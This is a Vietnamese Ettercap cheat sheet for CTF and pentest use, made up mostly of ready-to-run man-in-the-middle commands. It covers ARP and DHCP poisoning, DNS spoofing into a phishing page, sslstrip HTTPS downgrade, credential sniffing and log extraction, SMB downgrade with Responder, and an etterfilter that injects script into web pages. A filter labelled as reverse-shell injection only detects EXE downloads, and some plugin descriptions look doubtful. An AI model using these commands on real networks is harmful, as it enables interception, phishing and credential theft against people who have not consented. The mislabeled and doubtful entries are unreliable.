# 🕸️ Ettercap Cheat Sheet

> Dành cho CTF players, pentesters & MITM — theo docs chính thức + kinh nghiệm thực tế

---

## 📦 Cài đặt

```bash
# Ubuntu / Debian
sudo apt install ettercap-common ettercap-graphical

# Chỉ CLI (không cần GUI)
sudo apt install ettercap-text-only

# Build from source
git clone https://github.com/Ettercap/ettercap
cd ettercap && mkdir build && cd build
cmake ..
make && sudo make install

# Kiểm tra version
ettercap --version
```

---

## 🚀 Khởi động

```bash
# GUI mode (GTK)
sudo ettercap -G

# Text/interactive mode (TUI)
sudo ettercap -T

# Quiet/non-interactive (scripting, CTF)
sudo ettercap -T -q

# Chỉ định interface
sudo ettercap -T -i eth0

# Chạy lệnh script rồi thoát
sudo ettercap -T -q -i eth0 -M arp:remote /target1/ /target2/
```

---

## 🎯 Cú pháp target

```
/IP/                     # single IP
/IP1,IP2,IP3/            # multiple IPs
/IP1-IP5/                # IP range (không hỗ trợ CIDR trực tiếp)
//                       # toàn bộ subnet (broadcast)
/IP/ /IP/                # target1 và target2 (cho MITM)
```

Ví dụ:

```bash
/192.168.1.100/          # 1 host
/192.168.1.100,192.168.1.101/  # 2 hosts
//                       # tất cả
/192.168.1.1/ //         # gateway và tất cả hosts
```

---

## 🔧 Options quan trọng

|Option|Mô tả|
|---|---|
|`-T`|Text mode (TUI)|
|`-G`|GTK GUI mode|
|`-C`|Curses mode|
|`-D`|Daemon / background mode|
|`-q`|Quiet — không print packet content|
|`-i <iface>`|Chỉ định interface|
|`-I`|Liệt kê interfaces|
|`-M <method>`|MITM method (arp, icmp, dhcp, port)|
|`-P <plugin>`|Load plugin|
|`-F <filter>`|Load compiled filter|
|`-L <logfile>`|Log toàn bộ traffic|
|`-l <logfile>`|Log chỉ user messages|
|`-w <pcap>`|Ghi ra pcap file|
|`-r <pcap>`|Đọc từ pcap|
|`-p`|Không vào promiscuous mode|
|`-u`|Không decode protocol (raw)|
|`-s <cmds>`|Gửi commands tự động (scripting)|
|`-o`|Chỉ sniff, không MITM|
|`-b`|Reverse matching target|
|`--certificate`|SSL cert file|
|`--private-key`|SSL private key|

---

## 🎭 MITM Methods

### ARP Poisoning (phổ biến nhất)

```bash
# ARP MITM giữa target và gateway
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/

# ARP MITM toàn bộ mạng (cẩn thận — có thể gây lag mạng)
sudo ettercap -T -i eth0 -M arp:remote // //

# ARP oneway (chỉ 1 chiều)
sudo ettercap -T -i eth0 -M arp:oneway /192.168.1.100/ /192.168.1.1/

# ARP remote — forward packets (cần IP forwarding)
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo ettercap -T -i eth0 -M arp:remote /victim/ /gateway/
```

### ICMP Redirect

```bash
# ICMP MITM — ít phổ biến hơn, bypass một số IDS
sudo ettercap -T -i eth0 -M icmp:remote /192.168.1.100/ /192.168.1.1/
```

### DHCP Spoofing

```bash
# Giả làm DHCP server — cấp IP + gateway giả
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-210/255.255.255.0/192.168.1.1
#                                    IP pool           netmask         DNS
```

### Port Stealing

```bash
# Dùng khi switch có port security (không dùng được ARP)
sudo ettercap -T -i eth0 -M port:remote /192.168.1.100/ /192.168.1.1/
```

---

## 🔌 Plugins phổ biến

```bash
# Xem tất cả plugins
sudo ettercap -T -P list

# Load plugin khi chạy
sudo ettercap -T -i eth0 -P <plugin_name> -M arp:remote /victim/ /gateway/
```

### Các plugin hay dùng trong CTF

|Plugin|Tác dụng|
|---|---|
|`arp_cop`|Detect ARP poisoning (defensive)|
|`autoadd`|Tự động thêm new hosts vào target|
|`chk_poison`|Kiểm tra ARP poison có hoạt động không|
|`dns_spoof`|DNS spoofing (cần edit `/etc/ettercap/etter.dns`)|
|`dos_attack`|DoS một host|
|`finger`|Fingerprint OS của targets|
|`finger_submit`|Submit fingerprint lên DB|
|`gre_relay`|GRE tunnel relay|
|`isolation`|Cô lập host khỏi mạng|
|`link_type`|Detect loại switch|
|`pptp_chapms2`|Bắt PPTP VPN credentials|
|`remote_browser`|Mở URLs từ victim trên browser attacker|
|`repoison_arp`|Giữ ARP cache poisoned liên tục|
|`roper`|Inject shellcode vào executables|
|`search_promisc`|Tìm hosts đang chạy promiscuous mode|
|`sslstrip`|Strip HTTPS → HTTP|
|`smb_down`|Downgrade SMB auth|
|`smb_clear`|Clear SMB credentials|

### DNS Spoof Plugin

```bash
# Edit DNS spoof rules trước
sudo nano /etc/ettercap/etter.dns
```

```
# /etc/ettercap/etter.dns
microsoft.com     A   192.168.1.50
*.microsoft.com   A   192.168.1.50
*                 A   192.168.1.50   # catch all
```

```bash
# Chạy với dns_spoof plugin
sudo ettercap -T -i eth0 -P dns_spoof -M arp:remote /victim/ /gateway/
```

---

## 🔍 Sniffing (không MITM)

```bash
# Passive sniff — chỉ lắng nghe, không gửi gói
sudo ettercap -T -i eth0 -o

# Sniff với filter (BPF-like)
sudo ettercap -T -i eth0 -o -f "port 80"

# Ghi ra pcap
sudo ettercap -T -i eth0 -o -w /tmp/capture.pcap

# Đọc pcap
sudo ettercap -T -r /tmp/capture.pcap
```

---

## 🧩 Ettercap Filters (Content Injection)

### Viết filter

```c
/* inject.filter — inject vào HTTP response */
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("Removed Accept-Encoding\n");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "</body>")) {
        replace("</body>", "<script>alert('XSS')</script></body>");
        msg("Injected XSS payload\n");
    }
}
```

### Compile và load filter

```bash
# Compile filter
etterfilter inject.filter -o inject.ef

# Load filter khi chạy
sudo ettercap -T -i eth0 -F inject.ef -M arp:remote /victim/ /gateway/
```

### Filter thực dụng — strip SSL redirect

```c
/* sslstrip.filter */
if (ip.proto == TCP && tcp.src == 80) {
    replace("https://", "http://");
    replace("HTTPS://", "http://");
}
```

### Filter inject reverse shell vào executable download

```c
/* Detect exe download */
if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "MZ\x90\x00")) {
        msg("EXE detected — can inject here\n");
    }
}
```

---

## 📝 Logging & Output

```bash
# Log toàn bộ traffic (binary format)
sudo ettercap -T -i eth0 -L /tmp/full_log -M arp:remote /victim/ /gateway/

# Log chỉ messages/credentials (text)
sudo ettercap -T -i eth0 -l /tmp/creds.log -M arp:remote /victim/ /gateway/

# Đọc log binary
sudo etterlog /tmp/full_log.eci

# Đọc log theo protocol cụ thể
sudo etterlog -p /tmp/full_log.eci        # passwords only
sudo etterlog -c /tmp/full_log.eci        # connections only
sudo etterlog -i /tmp/full_log.eci        # infos

# Xuất ra text
sudo etterlog -t /tmp/full_log.eci > output.txt

# Xuất ra XML
sudo etterlog -x /tmp/full_log.eci > output.xml
```

---

## 🕵️ CTF & Pentest Patterns

### Pattern 1: Credential sniffing (HTTP, FTP, Telnet)

```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# MITM + log credentials
sudo ettercap -T -q -i eth0 \
  -l /tmp/creds.log \
  -M arp:remote /10.10.10.100/ /10.10.10.1/
```

### Pattern 2: DNS spoof → phishing page

```bash
# Step 1: Edit DNS rules
echo "target.com A 10.10.14.5" | sudo tee -a /etc/ettercap/etter.dns
echo "*.target.com A 10.10.14.5" | sudo tee -a /etc/ettercap/etter.dns

# Step 2: Fake web server
sudo python3 -m http.server 80

# Step 3: MITM + DNS spoof
sudo ettercap -T -q -i eth0 \
  -P dns_spoof \
  -M arp:remote /victim/ /gateway/
```

### Pattern 3: SSL Strip (HTTP downgrade)

```bash
# Cần iptables redirect
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sudo ettercap -T -q -i eth0 \
  -P sslstrip \
  -M arp:remote /victim/ /gateway/
```

### Pattern 4: SMB Relay / NTLM (Windows AD CTF)

```bash
# Downgrade SMB
sudo ettercap -T -q -i eth0 \
  -P smb_down \
  -M arp:remote /windows_host/ /gateway/

# Kết hợp với Responder để capture hash
sudo responder -I eth0 -wrf
```

### Pattern 5: Scripting tự động (non-interactive)

```bash
# Dùng -s để gửi commands tự động vào TUI
sudo ettercap -T -i eth0 \
  -M arp:remote /victim/ /gateway/ \
  -s 'lq'   # l = list connections, q = quit sau vài giây
```

### Pattern 6: MITM + ghi pcap → phân tích offline

```bash
sudo ettercap -T -q -i eth0 \
  -w /tmp/mitm_capture.pcap \
  -M arp:remote /victim/ /gateway/

# Sau đó phân tích với Wireshark hoặc tcpdump
tcpdump -r /tmp/mitm_capture.pcap -A | grep -i "pass\|user\|login"
wireshark /tmp/mitm_capture.pcap
```

---

## ⚙️ File cấu hình

```bash
# File cấu hình chính
/etc/ettercap/etter.conf

# DNS spoof rules
/etc/ettercap/etter.dns

# Passive OS fingerprint DB
/etc/ettercap/etter.finger.os

# Services/ports DB
/etc/ettercap/etter.services
```

### Chỉnh `etter.conf` quan trọng

```ini
# /etc/ettercap/etter.conf

[privs]
ec_uid = 0        # chạy với uid 0 (root)
ec_gid = 0

[mitm]
arp_storm_delay = 10       # ms giữa ARP packets
arp_poison_warm_up = 1     # warm up time
arp_poison_delay = 10      # delay giữa poison
arp_poison_icmp = 1        # gửi ICMP kết hợp
arp_poison_reply = 1       # reply to ARP requests

# Quan trọng: bật iptables redirect cho SSL
# Uncomment 2 dòng này trong etter.conf:
# redir_command_on = "iptables -t nat -A PREROUTING -i %iface ..."
# redir_command_off = "iptables -t nat -D PREROUTING -i %iface ..."
```

---

## 🛠️ etterfilter — Filter Compiler

```bash
# Xem filter syntax
man etterfilter

# Compile
etterfilter myfilter.filter -o myfilter.ef

# Load
ettercap -F myfilter.ef ...
```

### Filter functions quan trọng

```c
search(where, what)        // tìm string trong data
replace(what, with)        // thay thế string
inject(file)               // inject file vào stream
log(what, file)            // ghi vào log file
msg("text\n")              // print message ra console
drop()                     // drop packet
kill()                     // kill connection
exec("command")            // chạy shell command
pcre_match(where, regex)   // regex match
```

---

## 🔍 etterlog — Log Analyzer

```bash
# Xem tổng quan log
etterlog capture.eci

# Chỉ xem passwords
etterlog -p capture.eci

# Chỉ xem connections
etterlog -c capture.eci

# Filter theo host
etterlog -f 192.168.1.100 capture.eci

# Filter theo protocol
etterlog -F HTTP capture.eci
etterlog -F FTP capture.eci
etterlog -F SSH capture.eci

# Xuất XML
etterlog -x capture.eci > report.xml
```

---

## ⚠️ Troubleshooting

```bash
# Lỗi: "SSL dissector disabled"
# → Uncomment iptables lines trong /etc/ettercap/etter.conf

# Lỗi: ARP poison không hoạt động
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Lỗi: "can't open /dev/net/tun"
sudo modprobe tun

# Ettercap crash / không sniff được gì
# → Thử chạy -o (passive sniff trước) để xác nhận interface hoạt động

# Kiểm tra ARP poison có hoạt động
sudo ettercap -T -P chk_poison -M arp:remote /victim/ /gateway/

# Lỗi: "No such file: etter.conf"
sudo find / -name "etter.conf" 2>/dev/null
sudo ettercap -T --conf /path/to/etter.conf ...

# Restore ARP tables của victim sau khi xong
# Ettercap tự restore khi thoát bình thường (Ctrl+C)
# Force restore:
sudo ettercap -T -i eth0 -M arp:remote /victim/ /gateway/ -s 'q'
```

---

## 🆚 So sánh Ettercap vs Bettercap

|Tính năng|Ettercap|Bettercap|
|---|---|---|
|ARP spoofing|✅|✅|
|DNS spoofing|✅ plugin|✅ native|
|SSL strip|✅ plugin|✅ native|
|Content injection|✅ etterfilter|✅ JS inject|
|WiFi attacks|❌|✅|
|BLE attacks|❌|✅|
|Active development|⚠️ slow|✅|
|Scripting|⚠️ basic|✅ caplets|
|Web UI|❌|✅|
|CTF popularity|✅ classic|✅ modern|
|Stability|✅ proven|✅|
|Plugins/filters|✅ etterfilter|✅ JS proxy|

> **Khi nào dùng Ettercap?**
> 
> - Box/lab cũ yêu cầu ettercap cụ thể
> - Cần etterfilter để modify traffic layer thấp
> - Quen với workflow cũ
> - Kết hợp etterlog để phân tích log

> **Khi nào dùng Bettercap?**
> 
> - CTF/pentest hiện đại
> - Cần WiFi/BLE
> - Cần scripting mạnh (caplets)
> - Muốn Web UI

---

## 📚 Tài liệu tham khảo

- **Docs chính thức**: [https://www.ettercap-project.org/](https://www.ettercap-project.org/)
- **GitHub**: [https://github.com/Ettercap/ettercap](https://github.com/Ettercap/ettercap)
- **Man pages**: `man ettercap`, `man etterfilter`, `man etterlog`
- **Wiki**: [https://github.com/Ettercap/ettercap/wiki](https://github.com/Ettercap/ettercap/wiki)

---

_Chỉ sử dụng trên mạng và hệ thống bạn được phép kiểm tra. Cheat sheet này tổng hợp từ docs chính thức ettercap và kinh nghiệm CTF thực tế._